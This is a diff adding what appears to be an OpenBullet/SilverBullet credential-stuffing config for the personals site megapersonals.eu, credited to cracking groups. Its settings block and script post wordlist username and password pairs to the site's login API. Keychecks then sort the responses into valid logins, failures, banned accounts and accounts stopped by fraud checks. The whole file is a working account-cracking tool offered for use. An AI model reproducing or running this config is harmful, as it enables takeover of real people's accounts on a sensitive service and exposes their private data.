@@ -1,0 +1,99 @@
+[SETTINGS]
+{
+  "Name": "Megapersonals",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-06T21:51:00.943923+01:00",
+  "AdditionalInfo": "@Core_Crack & @Bruting",
+  "RequiredPlugins": [],
+  "Author": "DrConfiger",
+  "Version": "1.1.1 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "@Core_Crack & @Bruting",
+      "VariableName": "",
+      "Id": 1287643739
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Megapersonals",
+  "IconPath": "Icon\\svbfile.ico",
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://megapersonals.eu/users/api/login" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-GB,en-US;q=0.9,en;q=0.8,fa;q=0.7" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-length: 58" 
+  HEADER "origin: https://megapersonals.eu" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://megapersonals.eu/users/auth/login" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" Contains "users/posts/list" 
+  KEYCHAIN Failure OR 
+    KEY "This email address and password combination is incorrect." 
+    KEY "<ADDRESS>" Contains "login?error=t" 
+  KEYCHAIN Custom "Banned" OR 
+    KEY "<ADDRESS>" Contains "users/ban_message" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Our fraud and spam blockers have triggered." 
+
+FUNCTION Constant "@Core_Crack & @Bruting" 
+
